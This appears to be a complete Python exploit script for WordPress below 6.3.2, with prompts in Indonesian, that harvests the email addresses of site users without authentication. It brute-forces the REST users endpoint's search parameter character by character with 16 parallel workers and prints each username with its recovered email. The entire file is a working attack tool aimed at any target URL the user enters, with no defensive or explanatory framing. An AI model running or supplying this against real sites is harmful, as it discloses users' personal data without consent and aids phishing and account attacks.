#WPS < 6.3.2(Unauthenticated Post Author Email Disclosure)
from multiprocessing import Pool
import requests
import string
import json
import signal
import sys

known_users = {}
user_suffixes = []
current_suffix = '@'
headers = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136' }

def bruteforce_search(args):
    url, txt = args
    signal.signal(signal.SIGINT, signal.SIG_IGN)  # Ignore SIGINT in child process
    try:
        users = json.loads(requests.get(url, headers=headers, data=json.dumps({'search':txt})).text)
        return (txt, users)
    except KeyboardInterrupt:
        return (txt, [])  # Return empty result if KeyboardInterrupt occurs

def signal_handler(sig, frame):
    print('Ctrl+C ditekan. Berhenti...')
    sys.exit(0)

def zxWPS_632():
    signal.signal(signal.SIGINT, signal_handler)  # Set signal handler for SIGINT

    url = input("Masukkan URL target: ").rstrip('/') + '/wp-json/wp/v2/users'
    dic = string.ascii_lowercase + string.digits + '!#$&\'+\/=?^_`{|}~\.-]+'
    p = Pool(16)

    users = json.loads(requests.get(url).text)

    suffixes = [current_suffix + c for c in dic]

    for suffix, users in p.imap(bruteforce_search, [(url, s) for s in suffixes]):
        if len(users) > 0:
            print(users)
            for user in users:
                slug = user['slug']
                print(f'# Added user: {slug}, suffix: {suffix}')
                known_users[user['slug']] = suffix

    for user in known_users:
        print(f'# Bruteforcing email domain for {user}..')
        foundSomething = True
        while foundSomething:
            foundSomething = False
            suffixes = [known_users[user] + c for c in dic]
            for suffix, users_found in p.imap(bruteforce_search, [(url, s) for s in suffixes]):
                for user_found in users_found:
                    if user_found['slug'] == user:
                        print(suffix)
                        known_users[user] = suffix
                        foundSomething = True
                        break

    print('# Found the following:')
    for user in known_users:
        email = known_users[user]
        print(f'{user} => {email}')

